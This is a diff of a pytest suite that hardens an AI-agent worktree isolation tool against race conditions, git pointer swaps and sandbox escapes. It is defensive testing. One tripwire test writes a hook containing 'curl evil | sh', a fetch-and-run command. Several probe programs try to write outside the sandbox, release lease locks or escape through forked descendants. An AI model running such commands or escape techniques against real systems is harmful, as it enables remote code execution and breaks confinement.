@@ -32,10 +32,13 @@ from agent_flow.core.worktree_isolation import (
     assert_scopes_isolated,
     assert_worktree_mergeable,
     capture_leader_snapshot,
+    probe_provider_leases,
     real_path,
     sanitized_worker_env,
     verify_linked_worktree,
 )
+from agent_flow.providers.subprocess import ProviderCommand, run_provider
+from agent_flow.providers import subprocess as PROVIDER_PROCESS
 
 
 def _git(*args, cwd):
@@ -54,6 +57,99 @@ def _init_repo(root: Path) -> None:
 def _managed(root: Path) -> Path:
     return root / ".agent-flow" / "worktrees"
 
+
+def test_file_lease_rejects_parent_swap_between_validation_and_open(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+):
+    parent = tmp_path / "trusted"
+    parent.mkdir()
+    attacker = tmp_path / "attacker"
+    attacker.mkdir()
+    moved = tmp_path / "trusted-original"
+    lock_path = parent / "lease.lock"
+    real_open = W_ISO.os.open
+    swapped = False
+
+    def swapping_open(path, flags, mode=0o777, *, dir_fd=None):
+        nonlocal swapped
+        opens_lock = (
+            dir_fd is None and Path(path) == lock_path
+        ) or (
+            dir_fd is not None and str(path) == lock_path.name
+        )
+        if opens_lock and not swapped:
+            swapped = True
+            parent.rename(moved)
+            parent.symlink_to(attacker, target_is_directory=True)
+        if dir_fd is None:
+            return real_open(path, flags, mode)
+        return real_open(path, flags, mode, dir_fd=dir_fd)
+
+    monkeypatch.setattr(W_ISO.os, "open", swapping_open)
+
+    with pytest.raises(W_ISO.FileLeaseUnavailable):
+        with W_ISO.exclusive_file_lease(lock_path):
+            pytest.fail("a lease on the replaced parent must not be yielded")
+
+    assert swapped is True
+    assert not (attacker / lock_path.name).exists()
+
+
+def test_file_lease_rejects_path_inode_replacement_after_open(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+):
+    parent = tmp_path / "state"
+    parent.mkdir()
+    lock_path = parent / "lease.lock"
+    real_fstat = W_ISO.os.fstat
+    replaced = False
+
+    def replacing_fstat(fd):
+        nonlocal replaced
+        identity = real_fstat(fd)
+        if W_ISO.stat.S_ISREG(identity.st_mode) and not replaced:
+            replaced = True
+            lock_path.unlink()
+            lock_path.write_text("replacement", encoding="utf-8")
+        return identity
+
+    monkeypatch.setattr(W_ISO.os, "fstat", replacing_fstat)
+
+    with pytest.raises(W_ISO.FileLeaseUnavailable):
+        with W_ISO.exclusive_file_lease(lock_path):
+            pytest.fail("a lease on an unlinked inode must not be yielded")
+
+    assert replaced is True
+
+
+
+def test_file_lease_rejects_path_replacement_while_locking(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+):
+    parent = tmp_path / "state"
+    parent.mkdir()
+    lock_path = parent / "lease.lock"
+    real_flock = W_ISO.fcntl.flock
+    replaced = False
+
+    def replacing_flock(fd, operation):
+        nonlocal replaced
+        if operation & W_ISO.fcntl.LOCK_EX and not replaced:
+            replaced = True
+            lock_path.unlink()
+            lock_path.write_text("replacement", encoding="utf-8")
+        return real_flock(fd, operation)
+
+    monkeypatch.setattr(W_ISO.fcntl, "flock", replacing_flock)
+
+    with pytest.raises(W_ISO.FileLeaseUnavailable):
+        with W_ISO.exclusive_file_lease(lock_path):
+            pytest.fail("a lease whose path changed while locking must not be yielded")
+
+    assert replaced is True
 
 
 def test_sanitized_env_strips_leaky_git_vars():
@@ -75,6 +171,21 @@ def test_verify_accepts_valid_worktree(tmp_path):
         root=tmp_path, path=status.path, expected_branch=plan.branch
     )
     assert verified == real_path(status.path)
+
+
+def test_create_can_atomically_refuse_an_existing_worktree(tmp_path: Path):
+    _init_repo(tmp_path)
+    plan = W.plan_worktree(root=tmp_path, name="same-task")
+    created = W.create_worktree(root=tmp_path, plan=plan)
+
+    with pytest.raises(ValueError, match="already exists"):
+        W.create_worktree(
+            root=tmp_path,
+            plan=plan,
+            reuse_existing=False,
+        )
+
+    assert created.path.exists()
 
 
 def test_verify_rejects_leader(tmp_path):
@@ -102,6 +213,38 @@ def test_verify_rejects_symlink_escape(tmp_path):
     # realpath resolves the symlink out of the managed root -> reject.
     with pytest.raises(WorktreeIsolationError):
         verify_linked_worktree(root=tmp_path, path=link)
+
+
+def test_verify_rejects_a_symlinked_git_pointer(tmp_path: Path):
+    _init_repo(tmp_path)
+    status = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="pointer"),
+    )
+    pointer = status.path / ".git"
+    copied = status.path / ".git-copy"
+    copied.write_bytes(pointer.read_bytes())
+    pointer.unlink()
+    pointer.symlink_to(copied)
+
+    with pytest.raises(WorktreeIsolationError, match="pointer file"):
+        verify_linked_worktree(root=tmp_path, path=status.path)
+
+
+def test_verify_rejects_a_git_pointer_to_a_sibling_worktree(tmp_path: Path):
+    _init_repo(tmp_path)
+    first = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="first-pointer"),
+    )
+    second = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="second-pointer"),
+    )
+    (first.path / ".git").write_bytes((second.path / ".git").read_bytes())
+
+    with pytest.raises(WorktreeIsolationError, match="does not point back"):
+        verify_linked_worktree(root=tmp_path, path=first.path)
 
 
 def test_verify_rejects_wrong_branch(tmp_path):
@@ -233,6 +376,79 @@ def test_remove_refuses_unmerged_and_preserves(tmp_path):
     W.remove_worktree(root=tmp_path, status=status, allow_unmerged=True)
     assert not status.path.exists()
 
+
+def test_remove_rejects_recreated_checkout_with_same_path_branch_and_head(
+    tmp_path: Path,
+    monkeypatch,
+):
+    _init_repo(tmp_path)
+    status = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="remove-recreated"),
+    )
+    real_registered_at_path = W._registered_at_path
+    probes = 0
+
+    def recreate_before_final_identity_check(*, root: Path, path: Path):
+        nonlocal probes
+        probes += 1
+        if probes == 2:
+            _git("worktree", "remove", "--force", str(path), cwd=root)
+            _git("worktree", "add", str(path), status.branch, cwd=root)
+        return real_registered_at_path(root=root, path=path)
+
+    monkeypatch.setattr(W, "_registered_at_path", recreate_before_final_identity_check)
+    with pytest.raises(WorktreeIsolationError, match="registration changed"):
+        W.remove_worktree(
+            root=tmp_path,
+            status=status,
+            delete_branch=False,
+            require_merged=False,
+            allow_unmerged=True,
+        )
+
+    assert probes >= 2
+    assert status.path.exists()
+    assert real_path(status.path) in _registered(tmp_path)
+
+
+
+def test_registration_identity_survives_git_lock_and_unlock(tmp_path: Path):
+    _init_repo(tmp_path)
+    status = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="identity-lock"),
+    )
+    before = W._registered_at_path(root=tmp_path, path=status.path)
+    _git("worktree", "lock", str(status.path), cwd=tmp_path)
+    locked = W._registered_at_path(root=tmp_path, path=status.path)
+    _git("worktree", "unlock", str(status.path), cwd=tmp_path)
+    after = W._registered_at_path(root=tmp_path, path=status.path)
+
+    assert before is not None and before.registration_identity is not None
+    assert locked is not None and locked.registration_identity == before.registration_identity
+    assert after is not None and after.registration_identity == before.registration_identity
+
+
+def test_attach_rejects_recreated_checkout_after_reuse_consent(tmp_path: Path):
+    _init_repo(tmp_path)
+    status = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="attach-recreated"),
+    )
+    original_identity = status.registration_identity
+    assert original_identity is not None
+    _git("worktree", "remove", "--force", str(status.path), cwd=tmp_path)
+    _git("worktree", "add", str(status.path), status.branch, cwd=tmp_path)
+
+    recreated = W.get_worktree_status(root=tmp_path, name=status.name)
+    assert recreated.registration_identity != original_identity
+    with pytest.raises(WorktreeIsolationError, match="registration changed"):
+        W.attach_worktree(
+            root=tmp_path,
+            selector=status.name,
+            expected_registration_identity=original_identity,
+        )
 
 
 def test_unique_naming_produces_distinct_trees(tmp_path):
@@ -372,6 +588,10 @@ def _cli(argv, cwd, env=None):
     )
 
 
+@pytest.mark.skipif(
+    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
+    reason="macOS sandbox-exec confinement is required",
+)
 def test_e2e_team_run_next_confines_worker_writes_and_git(tmp_path):
     _init_repo(tmp_path)
     assert _cli(["team", "init", "--root", ".", "--name", "ft"], cwd=tmp_path).returncode == 0
@@ -416,6 +636,394 @@ def test_e2e_team_run_next_confines_worker_writes_and_git(tmp_path):
     ]
     assert dirty == []
 
+
+@pytest.mark.skipif(
+    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
+    reason="macOS sandbox-exec confinement is required",
+)
+def test_real_provider_process_is_confined_to_attested_checkout(tmp_path):
+    _init_repo(tmp_path)
+    (tmp_path / ".gitignore").write_text(".agent-flow/\n", encoding="utf-8")
+    _git("add", ".gitignore", cwd=tmp_path)
+    _git("commit", "-m", "ignore runtime", cwd=tmp_path)
+    worker = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="worker"),
+    )
+    sibling = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="sibling"),
+    )
+    leader_target = tmp_path / "leader-target.txt"
+    leader_target.write_text("leader\n", encoding="utf-8")
+    escape_link = worker.path / "leader-link"
+    escape_link.symlink_to(leader_target)
+    absolute_target = tmp_path.parent / f"{tmp_path.name}-absolute-leak.txt"
+    child_target = tmp_path / "child-leak.txt"
+    worker_state_target = worker.path / ".claude" / "settings.json"
+    worker_state_target.parent.mkdir()
+    git_pointer_before = (worker.path / ".git").read_bytes()
+    program = (
+        "import json, subprocess, sys\n"
+        "from pathlib import Path\n"
+        "leader, sibling, absolute, child, worker_state = map(Path, sys.argv[1:6])\n"
+        "def denied(path):\n"
+        "    try:\n"
+        "        path.write_text('leak', encoding='utf-8')\n"
+        "        return False\n"
+        "    except OSError:\n"
+        "        return True\n"
+        "Path('inside.txt').write_text('inside\\n', encoding='utf-8')\n"
+        "child_run = subprocess.run([sys.executable, '-c', "
+        "\"from pathlib import Path; import sys; Path(sys.argv[1]).write_text('child')\", "
+        "str(child)], capture_output=True, text=True)\n"
+        "result = {'leader': denied(leader), 'sibling': denied(sibling), "
+        "'absolute': denied(absolute), 'symlink': denied(Path('leader-link')), "
+        "'child': child_run.returncode != 0, 'worker-state': denied(worker_state), "
+        "'git-pointer': denied(Path('.git'))}\n"
+        "Path('confinement.json').write_text(json.dumps(result), encoding='utf-8')\n"
+    )
+    result = run_provider(
+        ProviderCommand(
+            name="confinement-probe",
+            argv=(
+                sys.executable,
+                "-c",
+                program,
+                str(leader_target),
+                str(sibling.path / "sibling-leak.txt"),
+                str(absolute_target),
+                str(child_target),
+                str(worker_state_target),
+            ),
+        ),
+        prompt="",
+        cwd=worker.path,
+    )
+
+    assert result.failed is False, result.stderr
+    assert (worker.path / "inside.txt").read_text(encoding="utf-8") == "inside\n"
+    denied = json.loads(
+        (worker.path / "confinement.json").read_text(encoding="utf-8")
+    )
+    assert denied == {
+        "leader": True,
+        "sibling": True,
+        "absolute": True,
+        "symlink": True,
+        "child": True,
+        "worker-state": True,
+        "git-pointer": True,
+    }
+    assert leader_target.read_text(encoding="utf-8") == "leader\n"
+    assert not (sibling.path / "sibling-leak.txt").exists()
+    assert not absolute_target.exists()
+    assert not child_target.exists()
+    assert not worker_state_target.exists()
+    assert (worker.path / ".git").read_bytes() == git_pointer_before
+
+
+@pytest.mark.skipif(
+    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
+    reason="macOS sandbox-exec confinement is required",
+)
+def test_provider_revalidates_worktree_identity_after_spawn(tmp_path, monkeypatch):
+    _init_repo(tmp_path)
+    worker = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="identity-worker"),
+    )
+    sibling = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="identity-sibling"),
+    )
+    marker = worker.path / "provider-started"
+    program = (
+        "import time; from pathlib import Path; "
+        "time.sleep(0.5); Path('provider-started').write_text('started')"
+    )
+    real_popen = PROVIDER_PROCESS.subprocess.Popen
+    swapped = False
+
+    def swap_identity_after_spawn(*args, **kwargs):
+        nonlocal swapped
+        command = args[0] if args else kwargs["args"]
+        normalized = tuple(str(item) for item in command)
+        proc = real_popen(*args, **kwargs)
+        if not swapped and program in normalized:
+            swapped = True
+            (worker.path / ".git").write_bytes((sibling.path / ".git").read_bytes())
+        return proc
+
+    monkeypatch.setattr(
+        PROVIDER_PROCESS.subprocess,
+        "Popen",
+        swap_identity_after_spawn,
+    )
+    result = run_provider(
+        ProviderCommand(
+            name="identity-swap",
+            argv=(sys.executable, "-c", program),
+        ),
+        prompt="",
+        cwd=worker.path,
+    )
+
+    assert swapped is True
+    assert result.failed is True
+    assert "worktree" in result.stderr
+    assert not marker.exists()
+
+
+@pytest.mark.skipif(
+    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
+    reason="macOS sandbox-exec confinement is required",
+)
+def test_read_only_provider_cannot_write_verified_worktree(tmp_path):
+    _init_repo(tmp_path)
+    worker = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="reviewer"),
+    )
+    marker = worker.path / "reviewer-write.txt"
+    program = (
+        "from pathlib import Path; import sys; "
+        "target = Path(sys.argv[1]); "
+        "\ntry:\n target.write_text('leak', encoding='utf-8')\n"
+        "except OSError:\n print('denied')\n"
+    )
+    result = run_provider(
+        ProviderCommand(
+            name="read-only-reviewer",
+            argv=(sys.executable, "-c", program, str(marker)),
+            allow_workspace_writes=False,
+        ),
+        prompt="",
+        cwd=worker.path,
+    )
+
+    assert result.failed is False, result.stderr
+    assert result.stdout.strip() == "denied"
+    assert not marker.exists()
+
+@pytest.mark.skipif(
+    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
+    reason="macOS sandbox-exec confinement is required",
+)
+def test_provider_cannot_unlock_its_repository_lease(tmp_path):
+    _init_repo(tmp_path)
+    worker = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="lease-adversary"),
+    )
+    ready = worker.path / "unlock-attempted"
+    program = (
+        "import fcntl, json, os, sys, time\n"
+        "from pathlib import Path\n"
+        "unlocked = {}\n"
+        "for fd in range(3, 256):\n"
+        "    try: fcntl.flock(fd, fcntl.LOCK_UN); unlocked[fd] = os.readlink(f'/dev/fd/{fd}')\n"
+        "    except OSError: pass\n"
+        "Path(sys.argv[1]).write_text(json.dumps(unlocked), encoding='utf-8')\n"
+        "time.sleep(1)\n"
+    )
+    with ThreadPoolExecutor(max_workers=1) as pool:
+        future = pool.submit(
+            run_provider,
+            ProviderCommand(
+                name="lease-adversary",
+                argv=(sys.executable, "-c", program, str(ready)),
+            ),
+            prompt="",
+            cwd=worker.path,
+        )
+        deadline = time.monotonic() + 2
+        while not ready.exists() and time.monotonic() < deadline:
+            time.sleep(0.01)
+        assert ready.exists()
+        assert probe_provider_leases(worker.path) == "active"
+        result = future.result(timeout=3)
+
+        unlocked = json.loads(ready.read_text(encoding="utf-8"))
+        assert all("provider-leases" not in path for path in unlocked.values())
+    assert result.failed is False, result.stderr
+
+
+@pytest.mark.skipif(
+    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
+    reason="macOS sandbox-exec confinement is required",
+)
+def test_escaped_provider_descendant_keeps_repository_lease(tmp_path):
+    _init_repo(tmp_path)
+    worker = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="descendant"),
+    )
+    ready = worker.path / "descendant-ready"
+    done = worker.path / "descendant-done"
+    program = (
+        "import os, sys, time\n"
+        "from pathlib import Path\n"
+        "ready, done = map(Path, sys.argv[1:3])\n"
+        "child = os.fork()\n"
+        "if child == 0:\n"
+        "    os.setsid()\n"
+        "    grandchild = os.fork()\n"
+        "    if grandchild:\n"
+        "        os._exit(0)\n"
+        "    ready.write_text('ready', encoding='utf-8')\n"
+        "    time.sleep(1.5)\n"
+        "    done.write_text('done', encoding='utf-8')\n"
+        "    os._exit(0)\n"
+        "os.waitpid(child, 0)\n"
+    )
+
+    result = run_provider(
+        ProviderCommand(
+            name="escaped-descendant",
+            argv=(
+                sys.executable,
+                "-c",
+                program,
+                str(ready),
+                str(done),
+            ),
+        ),
+        prompt="",
+        cwd=worker.path,
+    )
+
+    assert result.failed is True
+    assert "provider descendant remains active" in result.stderr
+    deadline = time.monotonic() + 2
+    while not ready.exists() and time.monotonic() < deadline:
+        time.sleep(0.01)
+    assert ready.exists()
+    assert probe_provider_leases(worker.path) == "active"
+    deadline = time.monotonic() + 3
+    while (
+        (not done.exists() or probe_provider_leases(worker.path) != "inactive")
+        and time.monotonic() < deadline
+    ):
+        time.sleep(0.01)
+    assert done.exists()
+    assert probe_provider_leases(worker.path) == "inactive"
+
+
+@pytest.mark.skipif(
+    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
+    reason="macOS sandbox-exec confinement is required",
+)
+def test_provider_output_is_bounded_for_sync_and_parallel_paths(tmp_path):
+    from agent_flow.providers.subprocess import MAX_PROVIDER_OUTPUT_BYTES
+    from agent_flow.subprocess_pool import (
+        SubprocessJob,
+        run_parallel,
+    )
+
+    _init_repo(tmp_path)
+    worker = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="output-bound"),
+    )
+    chunk_size = MAX_PROVIDER_OUTPUT_BYTES // 2 + 4096
+    program = (
+        "import os, sys, time\n"
+        "size = int(sys.argv[1])\n"
+        "os.write(1, b'o' * size)\n"
+        "os.write(2, b'e' * size)\n"
+        "time.sleep(30)\n"
+    )
+
+    sync_result = run_provider(
+        ProviderCommand(
+            name="bounded-sync",
+            argv=(sys.executable, "-c", program, str(chunk_size)),
+            timeout_s=10,
+        ),
+        prompt="",
+        cwd=worker.path,
+    )
+    parallel_result = run_parallel(
+        [
+            SubprocessJob(
+                job_id="bounded-parallel",
+                binary=sys.executable,
+                args=("-c", program, str(chunk_size)),
+                cwd=worker.path,
+                timeout_s=10,
+            )
+        ]
+    )[0]
+
+    assert sync_result.failed is True
+    assert "provider output exceeded" in sync_result.stderr
+    assert (
+        len(sync_result.stdout.encode()) + len(sync_result.stderr.encode())
+        <= MAX_PROVIDER_OUTPUT_BYTES + 256
+    )
+    assert parallel_result.error == (
+        f"provider output exceeded {MAX_PROVIDER_OUTPUT_BYTES} bytes"
+    )
+    assert (
+        len(parallel_result.stdout.encode())
+        + len(parallel_result.stderr.encode())
+        <= MAX_PROVIDER_OUTPUT_BYTES
+    )
+
+
+@pytest.mark.skipif(
+    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
+    reason="macOS sandbox-exec confinement is required",
+)
+def test_provider_timeouts_reap_sync_and_parallel_processes(tmp_path):
+    from agent_flow.subprocess_pool import SubprocessJob, run_parallel
+
+    _init_repo(tmp_path)
+    worker = W.create_worktree(
+        root=tmp_path,
+        plan=W.plan_worktree(root=tmp_path, name="timeout-reap"),
+    )
+    sync_marker = worker.path / "sync-survived"
+    parallel_marker = worker.path / "parallel-survived"
+    program = (
+        "import sys, time\n"
+        "from pathlib import Path\n"
+        "time.sleep(0.5)\n"
+        "Path(sys.argv[1]).write_text('survived', encoding='utf-8')\n"
+    )
+    started = time.monotonic()
+    sync_result = run_provider(
+        ProviderCommand(
+            name="timeout-sync",
+            argv=(sys.executable, "-c", program, str(sync_marker)),
+            timeout_s=0.05,
+        ),
+        prompt="",
+        cwd=worker.path,
+    )
+    parallel_result = run_parallel(
+        [
+            SubprocessJob(
+                job_id="timeout-parallel",
+                binary=sys.executable,
+                args=("-c", program, str(parallel_marker)),
+                cwd=worker.path,
+                timeout_s=0.05,
+            )
+        ]
+    )[0]
+    elapsed = time.monotonic() - started
+    time.sleep(0.6)
+
+    assert sync_result.failed is True
+    assert sync_result.exit_code is None
+    assert parallel_result.timed_out is True
+    assert elapsed < 3
+    assert not sync_marker.exists()
+    assert not parallel_marker.exists()
+
+
 def test_git_repo_state_classifies(tmp_path):
     from agent_flow.core import worktree_isolation as wi
     # fresh temp dir is not a git repo (and not under one)
@@ -454,28 +1062,51 @@ def test_scope_gate_ignores_same_worker_self_overlap():
         ])
 
 
-def test_e2e_non_git_scope_collision_is_rejected(tmp_path):
-    # No git repo -> no worktree isolation -> overlapping scopes on concurrent
-    # workers must be rejected fail-closed by the scope gate.
-    assert _cli(["team", "init", "--root", ".", "--name", "ft"], cwd=tmp_path).returncode == 0
-    for tid in ("t1", "t2"):
-        assert _cli(["team", "task", "--root", ".", "--team", "ft", "--id", tid,
-                     "--subject", "s", "--description", "d"], cwd=tmp_path).returncode == 0
-    for w in ("wA", "wB"):
-        assert _cli(["team", "worker", "--root", ".", "--team", "ft", "--name", w,
-                     "--role", "impl"], cwd=tmp_path).returncode == 0
-    for tid, w in (("t1", "wA"), ("t2", "wB")):
-        assert _cli(["team", "brief", "--root", ".", "--team", "ft", "--task", tid,
-                     "--worker", w, "--brief", "b", "--write-scope", "src/feature"], cwd=tmp_path).returncode == 0
-        assert _cli(["team", "approve-worker", "--root", ".", "--team", "ft", "--task", tid,
-                     "--worker", w, "--write-scope", "src/feature"], cwd=tmp_path).returncode == 0
-    # wB claims t2 -> in_progress; t1 stays pending for wA.
-    assert _cli(["team", "claim", "--root", ".", "--team", "ft", "--task", "t2",
-                 "--worker", "wB"], cwd=tmp_path).returncode == 0
-    res = _cli(["team", "run-next", "--root", ".", "--team", "ft", "--worker", "wA",
-                "--command", sys.executable, "-c", "print('must not run')"], cwd=tmp_path)
-    assert res.returncode == 2
-    assert "overlapping write scope" in (res.stdout + res.stderr)
+def test_e2e_non_git_provider_launch_is_rejected(tmp_path):
+    assert _cli(
+        ["team", "init", "--root", ".", "--name", "ft"],
+        cwd=tmp_path,
+    ).returncode == 0
+    assert _cli(
+        [
+            "team", "task", "--root", ".", "--team", "ft", "--id", "t1",
+            "--subject", "s", "--description", "d",
+        ],
+        cwd=tmp_path,
+    ).returncode == 0
+    assert _cli(
+        [
+            "team", "worker", "--root", ".", "--team", "ft", "--name", "w1",
+            "--role", "impl",
+        ],
+        cwd=tmp_path,
+    ).returncode == 0
+    assert _cli(
+        [
+            "team", "brief", "--root", ".", "--team", "ft", "--task", "t1",
+            "--worker", "w1", "--brief", "b", "--write-scope", "src/feature",
+        ],
+        cwd=tmp_path,
+    ).returncode == 0
+    assert _cli(
+        [
+            "team", "approve-worker", "--root", ".", "--team", "ft",
+            "--task", "t1", "--worker", "w1", "--write-scope", "src/feature",
+        ],
+        cwd=tmp_path,
+    ).returncode == 0
+
+    result = _cli(
+        [
+            "team", "run-next", "--root", ".", "--team", "ft",
+            "--worker", "w1", "--command", sys.executable, "-c",
+            "print('must not run')",
+        ],
+        cwd=tmp_path,
+    )
+    assert result.returncode == 2
+    assert "verified linked git worktree" in (result.stdout + result.stderr)
+    assert "must not run" not in result.stdout
 
 
 def _leader_state(root: Path) -> tuple[str, str, str]:
@@ -579,6 +1210,22 @@ def test_tripwire_detects_hook_content_swap(tmp_path):
     hook.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
     before = W_ISO.capture_leader_snapshot(tmp_path)
     hook.write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_detects_same_size_middle_change_in_large_file(tmp_path):
+    """불변: 큰 ignored/untracked 파일도 크기 표본이 아니라 전체 내용으로 판정한다."""
+    _isolated(tmp_path, "large-content")
+    large = tmp_path / "large.bin"
+    with large.open("wb") as handle:
+        handle.truncate(65 * 1024 * 1024)
+    before = W_ISO.capture_leader_snapshot(tmp_path)
+
+    with large.open("r+b") as handle:
+        handle.seek(32 * 1024 * 1024)
+        handle.write(b"leak")
+
     with pytest.raises(W_ISO.WorktreeIsolationError):
         W_ISO.assert_leader_unchanged(tmp_path, before)
 
@@ -742,37 +1389,127 @@ def test_recovery_commands_survive_a_hook_integrity_violation(tmp_path):
     assert "managed hook registration" in blocked.stderr
 
 
+def test_run_rejects_install_with_hooks_explicitly_disabled(tmp_path):
+    project = tmp_path / "proj"
+    project.mkdir()
+    node = shutil.which("node")
+    if node is None:
+        pytest.skip("node is required")
+    kit = Path(__file__).resolve().parents[1] / "bin" / "agent-flow-kit.mjs"
+    installed = subprocess.run(
+        (node, str(kit), "install", "--no-hooks"),
+        cwd=project,
+        capture_output=True,
+        text=True,
+    )
+    assert installed.returncode == 0, installed.stderr
+    _init_repo(project)
+
+    blocked = _cli(["run", "demo task", "--root", "."], cwd=project)
+
+    assert blocked.returncode == 2, blocked.stdout
+    assert "managed enforcement hooks are not enabled" in blocked.stderr
+    assert len(W.list_registered_worktrees(project)) == 1
+
+
+@pytest.mark.skipif(
+    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
+    reason="macOS sandbox-exec confinement is required",
+)
 def test_multi_review_reviewer_env_is_sanitized(tmp_path, monkeypatch):
-    """불변: reviewer 자식 프로세스는 오염된 GIT_DIR을 물려받지 않는다."""
+    """불변: reviewer 자식 프로세스는 오염된 Git discovery env를 물려받지 않는다."""
     from agent_flow import multi_review as MR
     from agent_flow.cli_detect import CliInfo
 
     _init_repo(tmp_path)
-    out = tmp_path / "angle.md"
+    plan = W.plan_worktree(root=tmp_path, name="multi-review")
+    status = W.create_worktree(root=tmp_path, plan=plan)
+    linked = status.path
+    out = linked / "angle.md"
     probe = (
-        "import os,sys,subprocess\n"
+        "import os,subprocess\n"
+        f"names={W_ISO.LEAKY_GIT_ENV_VARS!r}\n"
         "top=subprocess.run(['git','rev-parse','--show-toplevel'],capture_output=True,text=True).stdout.strip()\n"
-        "print('GITDIR=%s' % os.environ.get('GIT_DIR','<unset>'))\n"
-        "print('WORKTREE=%s' % os.environ.get('GIT_WORK_TREE','<unset>'))\n"
+        "leaks=','.join(name for name in names if name in os.environ)\n"
+        "print('LEAKS=%s' % (leaks or '<none>'))\n"
         "print('TOP=%s' % os.path.realpath(top) if top else 'TOP=')\n"
     )
-    fake = CliInfo(name="probe", binaries=(sys.executable,), invoke=("-c", probe, "--prompt"))
+    fake = CliInfo(
+        name="probe",
+        binaries=(sys.executable,),
+        invoke=("-c", probe, "--prompt"),
+    )
     monkeypatch.setattr(MR, "cli_by_name", lambda name: fake)
-    # 부모 환경을 오염시킨다. env를 넘기지 않으면 자식이 이걸 그대로 상속한다.
-    monkeypatch.setenv("GIT_DIR", str(tmp_path / ".git"))
-    monkeypatch.setenv("GIT_WORK_TREE", str(tmp_path))
+    for name in W_ISO.LEAKY_GIT_ENV_VARS:
+        monkeypatch.setenv(name, str(tmp_path / f"poison-{name}"))
 
     distribution = MR.Distribution(
-        by_cli={"probe": [MR.ReviewerJob(angle_id="a1", prompt="review", output_path=out)]},
+        by_cli={
+            "probe": [
+                MR.ReviewerJob(
+                    angle_id="a1",
+                    prompt="review",
+                    output_path=out,
+                    artifact_root=out.parent,
+                )
+            ]
+        },
+        host="probe",
+    )
+    results = MR.run_distribution(distribution, linked, timeout_s=60)
+
+    assert len(results) == 1
+    assert results[0].ok
+    rendered = out.read_text(encoding="utf-8")
+    assert "LEAKS=<none>" in rendered
+    assert f"TOP={real_path(linked)}" in rendered
+
+
+def test_multi_review_rejects_non_linked_cwd_before_spawn(
+    tmp_path, monkeypatch
+):
+    from agent_flow import multi_review as MR
+    from agent_flow.cli_detect import CliInfo
+    from agent_flow import subprocess_pool as POOL
+
+    _init_repo(tmp_path)
+    out = tmp_path / "angle.md"
+    fake = CliInfo(
+        name="probe",
+        binaries=(sys.executable,),
+        invoke=("-c", "print('spawned')", "--prompt"),
+    )
+    monkeypatch.setattr(MR, "cli_by_name", lambda name: fake)
+    launches = []
+
+    async def forbidden_spawn(*args, **kwargs):
+        launches.append((args, kwargs))
+        raise AssertionError("reviewer command was spawned")
+
+    monkeypatch.setattr(POOL.asyncio, "create_subprocess_exec", forbidden_spawn)
+    distribution = MR.Distribution(
+        by_cli={
+            "probe": [
+                MR.ReviewerJob(
+                    angle_id="a1",
+                    prompt="review",
+                    output_path=out,
+                    artifact_root=out.parent,
+                )
+            ]
+        },
         host="host-cli",
     )
     results = MR.run_distribution(distribution, tmp_path, timeout_s=60)
+
     assert len(results) == 1
-    rendered = out.read_text(encoding="utf-8")
-    assert "GITDIR=<unset>" in rendered
-    assert "WORKTREE=<unset>" in rendered
-    # 오염된 env가 걸러졌으므로 자식의 git은 cwd에서 저장소를 다시 찾는다.
-    assert f"TOP={real_path(tmp_path)}" in rendered
+    assert results[0].error == (
+        "external providers require a verified linked worktree cwd"
+    )
+    assert launches == []
+    assert "external providers require a verified linked worktree cwd" in (
+        out.read_text(encoding="utf-8")
+    )
 
 
 def test_run_blocks_when_git_state_unknown(tmp_path, monkeypatch):
@@ -781,14 +1518,10 @@ def test_run_blocks_when_git_state_unknown(tmp_path, monkeypatch):
     import io
 
     from agent_flow import cli as CLI
-    from agent_flow.core import commands as C
 
     _init_repo(tmp_path)
 
-    def _timeout(*args, **kwargs):
-        raise subprocess.TimeoutExpired(cmd="git", timeout=5)
-
-    monkeypatch.setattr(C.subprocess, "run", _timeout)
+    monkeypatch.setattr(CLI, "git_repo_state", lambda _root: "unknown")
     stderr = io.StringIO()
     with contextlib.redirect_stderr(stderr):
         code = CLI.main(["run", "some task", "--root", str(tmp_path)])
@@ -843,48 +1576,66 @@ def test_normalized_name_reuses_the_same_worktree(tmp_path):
     assert real_path(forked_status.path) != real_path(created.path)
 
 
-def _team_fixture(root: Path) -> None:
-    assert _cli(["team", "init", "--root", ".", "--name", "ft"], cwd=root).returncode == 0
-    for tid in ("t1", "t2"):
-        assert _cli(["team", "task", "--root", ".", "--team", "ft", "--id", tid,
